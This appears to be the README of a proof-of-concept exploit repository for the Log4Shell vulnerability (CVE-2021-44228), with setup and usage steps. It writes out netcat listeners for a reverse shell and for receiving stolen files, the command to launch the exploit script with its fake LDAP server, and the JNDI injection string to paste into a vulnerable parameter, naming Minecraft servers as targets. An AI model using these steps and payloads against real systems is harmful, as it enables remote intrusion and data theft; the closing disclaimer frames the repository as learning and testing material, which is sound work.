# log4j-shell-poc
A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability.

Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.

In this repository there is an example vulnerable application and proof-of-concept (POC) exploit of it.


Proof-of-concept (POC)
----------------------

As a PoC there is a python file that automates the process. 


#### Requirements:
```bash
pip install -r requirements.txt
```


#### Usage:

* Start a netcat listener to accept reverse shell connection.<br>
```bash
$ nc -lvnp 9001 # For remote shell
$ nc -lvnp 9001 > stolen-data.zip # For document stealer
```


* Launch the exploit.<br>
**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.

```bash
$ python3 poc.py --userip >>HOST_IP<< --webport 8000 --lport 9001 --payload >>/PATH/TO/PAYLOAD<<

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.


Vulnerable application
--------------------------

Any java application that uses the vulnrable version of log4j would work, I use a Minecraft server, version 1.8-1.18.0 are all vulnrable. 

Old versions of the server can be donwloaded in the official Minecraft launcher or at [MCVersions.net](http://www.mcversions.net)


Getting the Java version.
--------------------------------------

Oracle thankfully provides an archive for all previous java versions:<br>
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).<br>
Scroll down to `8u20` and download the appropriate files for your operating system and hardware.

**Note:** You do need to make an account to be able to download the package.

Once you have downloaded and extracted the archive, you can find `java` and a few related binaries in `jdk1.8.0_20/bin`.<br>
**Note:** Make sure to extract the jdk folder into this repository with the same name in order for it to work.

```
❯ tar -xf jdk-8u20-linux-x64.tar.gz

❯ ./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```

Disclaimer
----------
This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).
